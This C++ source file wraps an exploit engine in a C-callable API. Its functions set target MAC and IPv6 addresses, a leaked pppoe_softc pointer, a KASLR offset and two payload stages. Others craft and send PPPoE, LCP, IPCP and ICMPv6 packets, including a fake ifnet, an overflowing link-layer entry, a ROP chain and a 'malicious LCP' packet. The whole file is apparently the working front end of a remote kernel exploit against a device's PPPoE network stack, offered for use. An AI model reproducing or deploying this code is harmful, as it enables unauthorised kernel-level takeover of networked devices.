#include "exploit.h"
#include <EndianPortable.h>

#define COPY_TO_BUFFER(buffer, packet) \
    size < packet.getRawPacket()->getRawDataLen() ? 0 : memcpy(buffer, packet.getRawPacket()->getRawData(), packet.getRawPacket()->getRawDataLen()), packet.getRawPacket()->getRawDataLen()

#ifndef htole64
#define htole64
#endif

extern "C" {

static Exploit exploit;

int setFirmwareVersion(int version) {
    return exploit.setFirmwareVersion(FirmwareVersion(version));
}

int setInterface(const char *iface) {
    return exploit.setInterface(iface);
}

void closeInterface() {
    exploit.closeInterface();
}

int run() {
    return exploit.run();
}

void setSourceMac(const char *mac) {
    exploit.source_mac = pcpp::MacAddress(mac);
}

void setTargetMac(const char *mac) {
    exploit.target_mac = pcpp::MacAddress(mac);
}

void setPppoeSoftc(uint64_t pppoe_softc) {
    exploit.pppoe_softc = pppoe_softc;
}

void setKaslrOffset(uint64_t value) {
    exploit.kaslr_offset = value;
}

void setStage1(const uint8_t *data, uint64_t size) {
    exploit.setStage1(std::vector<uint8_t>(data, data + size));
}

void setStage2(const uint8_t *data, uint64_t size) {
    exploit.setStage2(std::vector<uint8_t>(data, data + size));
}

void setTargetIpv6(const char *ipv6) {
    exploit.target_ipv6 = pcpp::IPv6Address(ipv6);
}

uint64_t buildFakeIfnet(uint8_t *buffer, uint64_t size) {
    auto data = Exploit::build_fake_ifnet(&exploit);
    memcpy(buffer, data.data(), data.size());
    return data.size();
}

uint64_t buildOverflowLle(uint8_t *buffer, uint64_t size) {
    auto data = Exploit::build_overflow_lle(&exploit);
    memcpy(buffer, data.data(), data.size());
    return data.size();
}

uint64_t buildFakeLle(uint8_t *buffer, uint64_t size) {
    auto data = Exploit::build_fake_lle(&exploit);
    memcpy(buffer, data.data(), data.size());
    return data.size();
}

uint64_t buildSecondRop(uint8_t *buffer, uint64_t size) {
    auto data = Exploit::build_second_rop(&exploit);
    memcpy(buffer, data.data(), data.size());
    return data.size();
}

int buildPado(uint8_t *buffer, uint64_t size, uint8_t *cookie, uint64_t cookie_size) {
    uint64_t temp = htole64(exploit.pppoe_softc);
    pcpp::Packet &&packet = PacketBuilder::pado(exploit.source_mac, exploit.target_mac,
                                                cookie, cookie_size,
                                                (uint8_t * ) & temp, sizeof(uint64_t));
    return COPY_TO_BUFFER(buffer, packet);
}

void sendPado(uint8_t *cookie, uint64_t cookie_size) {
    uint64_t temp = htole64(exploit.pppoe_softc);
    pcpp::Packet &&packet = PacketBuilder::pado(exploit.source_mac, exploit.target_mac,
                                                cookie, cookie_size,
                                                (uint8_t * ) & temp, sizeof(uint64_t));
    exploit.dev->sendPacket(&packet);
}

int buildPads(uint8_t *buffer, uint64_t size) {
    uint64_t temp = htole64(exploit.pppoe_softc);
    pcpp::Packet &&packet = PacketBuilder::pads(exploit.source_mac, exploit.target_mac,
                                                (uint8_t * ) & temp, sizeof(uint64_t));
    return COPY_TO_BUFFER(buffer, packet);
}

void sendPads() {
    uint64_t temp = htole64(exploit.pppoe_softc);
    pcpp::Packet &&packet = PacketBuilder::pads(exploit.source_mac, exploit.target_mac,
                                                (uint8_t * ) & temp, sizeof(uint64_t));
    exploit.dev->sendPacket(&packet);
}

int buildPadt(uint8_t *buffer, uint64_t size) {
    pcpp::Packet &&packet = PacketBuilder::padt(exploit.source_mac, exploit.target_mac);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendPadt() {
    pcpp::Packet &&packet = PacketBuilder::padt(exploit.source_mac, exploit.target_mac);
    exploit.dev->sendPacket(&packet);
}

int buildLcpRequest(uint8_t *buffer, uint64_t size) {
    pcpp::Packet &&packet = PacketBuilder::lcpRequest(exploit.source_mac, exploit.target_mac);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendLcpRequest() {
    pcpp::Packet &&packet = PacketBuilder::lcpRequest(exploit.source_mac, exploit.target_mac);
    exploit.dev->sendPacket(&packet);
}

int buildLcpAck(uint8_t *buffer, uint64_t size, uint8_t id) {
    pcpp::Packet &&packet = PacketBuilder::lcpAck(exploit.source_mac, exploit.target_mac, id);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendLcpAck(uint8_t id) {
    pcpp::Packet &&packet = PacketBuilder::lcpAck(exploit.source_mac, exploit.target_mac, id);
    exploit.dev->sendPacket(&packet);
}

int buildIpcpRequest(uint8_t *buffer, uint64_t size) {
    pcpp::Packet &&packet = PacketBuilder::ipcpRequest(exploit.source_mac, exploit.target_mac);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendIpcpRequest() {
    pcpp::Packet &&packet = PacketBuilder::ipcpRequest(exploit.source_mac, exploit.target_mac);
    exploit.dev->sendPacket(&packet);
}

int buildIpcpNak(uint8_t *buffer, uint64_t size, uint8_t id) {
    pcpp::Packet &&packet = PacketBuilder::ipcpNak(exploit.source_mac, exploit.target_mac, id);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendIpcpNak(uint8_t id) {
    pcpp::Packet &&packet = PacketBuilder::ipcpNak(exploit.source_mac, exploit.target_mac, id);
    exploit.dev->sendPacket(&packet);
}

int buildIpcpAck(uint8_t *buffer, uint64_t size, uint8_t id, uint8_t *option, uint64_t option_size) {
    pcpp::Packet &&packet = PacketBuilder::ipcpAck(exploit.source_mac, exploit.target_mac, id, option, option_size);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendIpcpAck(uint8_t id, uint8_t *option, uint64_t option_size) {
    pcpp::Packet &&packet = PacketBuilder::ipcpAck(exploit.source_mac, exploit.target_mac, id, option, option_size);
    exploit.dev->sendPacket(&packet);
}

int buildIcmpv6Echo(uint8_t *buffer, uint64_t size, const char *source_ipv6) {
    pcpp::Packet &&packet = PacketBuilder::icmpv6Echo(exploit.source_mac, exploit.target_mac,
                                                      pcpp::IPv6Address(source_ipv6), exploit.target_ipv6);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendIcmpv6Echo(const char *source_ipv6) {
    pcpp::Packet &&packet = PacketBuilder::icmpv6Echo(exploit.source_mac, exploit.target_mac,
                                                      pcpp::IPv6Address(source_ipv6), exploit.target_ipv6);
    exploit.dev->sendPacket(&packet);
}

int buildIcmpv6Na(uint8_t *buffer, uint64_t size, const char *source_ipv6) {
    pcpp::Packet &&packet = PacketBuilder::icmpv6Na(exploit.source_mac, exploit.target_mac,
                                                    pcpp::IPv6Address(source_ipv6), exploit.target_ipv6);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendIcmpv6Na(const char *source_ipv6) {
    pcpp::Packet &&packet = PacketBuilder::icmpv6Na(exploit.source_mac, exploit.target_mac,
                                                    pcpp::IPv6Address(source_ipv6), exploit.target_ipv6);
    exploit.dev->sendPacket(&packet);
}

int buildPinCpu0(uint8_t *buffer, uint64_t size) {
    pcpp::Packet &&packet = PacketBuilder::pinCpu0(exploit.source_mac, exploit.target_mac);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendPinCpu0() {
    pcpp::Packet &&packet = PacketBuilder::pinCpu0(exploit.source_mac, exploit.target_mac);
    exploit.dev->sendPacket(&packet);
}

int buildMaliciousLcp(uint8_t *buffer, uint64_t size) {
    std::vector<uint8_t> overflow_lle = Exploit::build_overflow_lle(&exploit);
    pcpp::Packet &&packet = PacketBuilder::maliciousLcp(exploit.source_mac, exploit.target_mac, overflow_lle.data(),
                                                        overflow_lle.size());
    return COPY_TO_BUFFER(buffer, packet);
}

void sendMaliciousLcp() {
    std::vector<uint8_t> overflow_lle = Exploit::build_overflow_lle(&exploit);
    pcpp::Packet &&packet = PacketBuilder::maliciousLcp(exploit.source_mac, exploit.target_mac, overflow_lle.data(),
                                                        overflow_lle.size());
    exploit.dev->sendPacket(&packet);
}

int buildLcpEchoReply(uint8_t *buffer, uint64_t size, const char *source_mac, const char *target_mac, int16_t session,
                      uint8_t id, uint32_t magic_number) {
    auto source = pcpp::MacAddress(source_mac);
    auto target = pcpp::MacAddress(target_mac);
    pcpp::Packet &&packet = PacketBuilder::lcpEchoReply(source, target, session, id, magic_number);

    return COPY_TO_BUFFER(buffer, packet);
}

void sendLcpEchoReply(const char *source_mac, const char *target_mac,
                      int16_t session, uint8_t id, uint32_t magic_number) {
    auto source = pcpp::MacAddress(source_mac);
    auto target = pcpp::MacAddress(target_mac);
    pcpp::Packet &&packet = PacketBuilder::lcpEchoReply(source, target, session, id, magic_number);
    exploit.dev->sendPacket(&packet);
}

int buildLcpTerminate(uint8_t *buffer, uint64_t size) {
    pcpp::Packet &&packet = PacketBuilder::lcpTerminate(exploit.source_mac, exploit.target_mac);
    return COPY_TO_BUFFER(buffer, packet);
}

void sendLcpTerminate() {
    pcpp::Packet &&packet = PacketBuilder::lcpTerminate(exploit.source_mac, exploit.target_mac);
    exploit.dev->sendPacket(&packet);
}

}